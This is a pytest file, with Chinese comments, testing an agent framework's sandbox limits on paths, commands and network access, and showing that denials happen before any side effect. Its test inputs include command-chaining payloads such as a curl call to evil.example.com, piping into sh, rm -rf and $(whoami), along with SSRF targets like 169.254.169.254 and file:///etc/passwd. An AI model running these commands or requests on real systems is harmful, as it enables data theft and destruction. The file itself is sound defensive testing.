"""W8 D4：沙箱三道边界（路径 / 命令 / 网络）+ 超时 + 输出上限。

Gate 8 #9 的判据是"三类越界各被拦一次，且在副作用之前"。
这里第一个断言是"拦住了"，第二个是**没留下痕迹**（这才是"在副作用之前"）。
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest
from agent_framework.skills import (
    COMMAND_DENIED,
    NETWORK_DENIED,
    PATH_DENIED,
    SandboxLimits,
    SandboxPolicy,
)


@pytest.fixture()
def workspace(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    root.mkdir()
    (root / ".git").mkdir()
    (root / ".git" / "config").write_text("[remote]\n", "utf-8")
    (root / ".env").write_text("API_KEY=sk-live-secret\n", "utf-8")
    return root


# --------------------------------------------------------------------------- #
# 路径
# --------------------------------------------------------------------------- #


def test_inside_root_is_allowed(workspace: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,))

    assert policy.check_path(workspace / "briefs" / "a.md").allowed


def test_relative_path_resolves_against_first_root(workspace: Path) -> None:
    """工具参数里的 `briefs/a.md` 是相对工作区的，不是相对进程 cwd 的。"""

    policy = SandboxPolicy(write_roots=(workspace,))

    assert policy.check_path("briefs/a.md").allowed


def test_dotdot_escape_is_denied(workspace: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,))

    decision = policy.check_path(workspace / ".." / "outside.txt")

    assert decision.code == PATH_DENIED
    assert not (workspace.parent / "outside.txt").exists()


def test_symlink_escape_is_denied(workspace: Path, tmp_path: Path) -> None:
    """符号链接是这条路最容易被绕的点：字符串比较看不出问题。"""

    outside = tmp_path / "outside"
    outside.mkdir()
    link = workspace / "link"
    link.symlink_to(outside, target_is_directory=True)

    decision = SandboxPolicy(write_roots=(workspace,)).check_path(link / "x.txt")

    assert decision.code == PATH_DENIED


def test_env_file_is_denied(workspace: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,))

    assert policy.check_path(workspace / ".env").code == PATH_DENIED
    assert policy.check_path(workspace / ".env.local").code == PATH_DENIED


def test_ssh_dir_is_denied_even_inside_root(tmp_path: Path) -> None:
    (tmp_path / ".ssh").mkdir()

    decision = SandboxPolicy(write_roots=(tmp_path,)).check_path(tmp_path / ".ssh" / "id_rsa")

    assert decision.code == PATH_DENIED


def test_git_config_is_denied_but_git_dir_is_not_wholesale_blocked(
    workspace: Path,
) -> None:
    """`.git/config` 里有 remote 凭据；但 `git status` 要读 `.git`，不能全禁。"""

    policy = SandboxPolicy(write_roots=(workspace,))

    assert policy.check_path(workspace / ".git" / "config").code == PATH_DENIED
    assert policy.check_path(workspace / ".git" / "HEAD").allowed


def test_no_roots_means_deny_everything(tmp_path: Path) -> None:
    """忘配 root 时默认拒绝，而不是默认全盘可写。"""

    assert SandboxPolicy().check_path(tmp_path / "x").code == PATH_DENIED


# --------------------------------------------------------------------------- #
# 命令
# --------------------------------------------------------------------------- #


def _command_policy(**kwargs: object) -> SandboxPolicy:
    return SandboxPolicy(
        command_prefixes=("pytest", "ruff", "git status", "git diff", "echo", "sleep"),
        **kwargs,  # type: ignore[arg-type]
    )


def test_whitelisted_command_is_allowed() -> None:
    policy = _command_policy()

    assert policy.check_command("pytest -q").allowed
    assert policy.check_command("git status --porcelain").allowed


def test_command_with_extra_whitespace_is_normalized() -> None:
    """`pytest    -q` 与 `pytest -q` 必须命中同一条前缀。"""

    assert _command_policy().check_command("pytest     -q").allowed


@pytest.mark.parametrize(
    "command",
    [
        "pytest; rm -rf /tmp/x",
        "pytest && curl http://evil.example.com/x",
        "pytest || true",
        "pytest | sh",
        "pytest `whoami`",
        "pytest $(whoami)",
        "pytest > /etc/passwd",
    ],
)
def test_chain_symbols_are_denied(command: str) -> None:
    """前缀白名单最大的洞：`pytest; rm -rf /` 在匹配层面就是 `pytest`。"""

    decision = _command_policy().check_command(command)

    assert decision.code == COMMAND_DENIED
    assert "链式" in decision.detail


def test_rm_rf_is_denied() -> None:
    assert _command_policy().check_command("rm -rf /tmp/x").code == COMMAND_DENIED


def test_sudo_is_denied() -> None:
    assert _command_policy().check_command("sudo ls").code == COMMAND_DENIED


def test_git_push_force_is_denied_even_if_push_looked_whitelisted() -> None:
    """参数级黑名单的理由：`git push` 与 `git status` 在前缀层没有差别。"""

    policy = SandboxPolicy(command_prefixes=("git",))

    assert policy.check_command("git push --force origin main").code == COMMAND_DENIED


def test_unlisted_command_is_denied() -> None:
    decision = _command_policy().check_command("curl http://example.com")

    assert decision.code == COMMAND_DENIED
    assert "白名单" in decision.detail


def test_no_prefixes_means_deny_all() -> None:
    assert SandboxPolicy().check_command("echo hi").code == COMMAND_DENIED


# --------------------------------------------------------------------------- #
# 网络
# --------------------------------------------------------------------------- #


def test_network_denied_by_default() -> None:
    assert SandboxPolicy().check_network("https://example.com").code == NETWORK_DENIED


def test_allowlisted_domain_and_subdomain() -> None:
    policy = SandboxPolicy(network_allow=("example.com",))

    assert policy.check_network("https://example.com/a").allowed
    assert policy.check_network("https://api.example.com/a").allowed


def test_lookalike_domain_is_denied() -> None:
    """`evilexample.com` 不能因为后缀匹配被放行。"""

    policy = SandboxPolicy(network_allow=("example.com",))

    assert policy.check_network("https://evilexample.com").code == NETWORK_DENIED


@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8080/",
        "http://localhost/",
        "http://192.168.1.10/",
        "http://10.0.0.7/",
        "http://172.16.0.1/",
    ],
)
def test_internal_and_metadata_addresses_are_hard_denied(url: str) -> None:
    """即使被写进白名单也拒：一次 SSRF 就能换到整台机器的临时凭据。"""

    policy = SandboxPolicy(network_allow=("169.254.169.254", "localhost", "10.0.0.7"))

    assert policy.check_network(url).code == NETWORK_DENIED


def test_non_http_scheme_is_denied() -> None:
    policy = SandboxPolicy(network_allow=("example.com",))

    assert policy.check_network("file:///etc/passwd").code == NETWORK_DENIED


# --------------------------------------------------------------------------- #
# 统一入口与真实执行
# --------------------------------------------------------------------------- #


def test_check_returns_first_denial(workspace: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,), command_prefixes=("echo",))

    decision = policy.check(command="echo hi", path=workspace / ".." / "x")

    assert decision.code == PATH_DENIED


async def test_run_command_refuses_before_side_effect(workspace: Path) -> None:
    """边界在副作用之前：被拒的命令根本不会被执行。"""

    target = workspace / "should_not_exist.txt"
    policy = SandboxPolicy(write_roots=(workspace,), command_prefixes=("echo",))

    result = await policy.run_command(f"echo x > {target}")

    assert result.denied_code == COMMAND_DENIED
    assert not target.exists()


async def test_run_command_executes_and_captures_output(workspace: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,), command_prefixes=("echo",))

    result = await policy.run_command("echo hello", cwd=workspace)

    assert result.ok
    assert result.stdout.strip() == "hello"
    # 子进程环境被收敛：不带任何凭据变量。
    assert "OPENAI_API_KEY" not in result.stdout


async def test_run_command_timeout_kills_process_tree(workspace: Path) -> None:
    policy = SandboxPolicy(
        write_roots=(workspace,),
        command_prefixes=("sleep",),
        limits=SandboxLimits(timeout_s=0.2),
    )

    result = await policy.run_command("sleep 5", cwd=workspace)

    assert result.timed_out
    assert not result.ok


async def test_run_command_output_is_capped(workspace: Path) -> None:
    """不设上限时 `yes` 能在几秒内把磁盘写满。"""

    python = sys.executable
    policy = SandboxPolicy(
        write_roots=(workspace,),
        command_prefixes=(python,),
        limits=SandboxLimits(timeout_s=10.0, max_output_chars=200),
    )

    result = await policy.run_command(f'{python} -c "print(\'x\'*5000)"', cwd=workspace)

    assert result.truncated
    assert len(result.stdout) <= 200


async def test_run_command_cwd_outside_root_is_denied(workspace: Path, tmp_path: Path) -> None:
    policy = SandboxPolicy(write_roots=(workspace,), command_prefixes=("echo",))

    result = await policy.run_command("echo hi", cwd=tmp_path)

    assert result.denied_code == PATH_DENIED


def test_env_is_stripped(workspace: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """命令是模型选的，它不该看见凭据。"""

    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    assert os.environ["OPENAI_API_KEY"]  # 前提成立
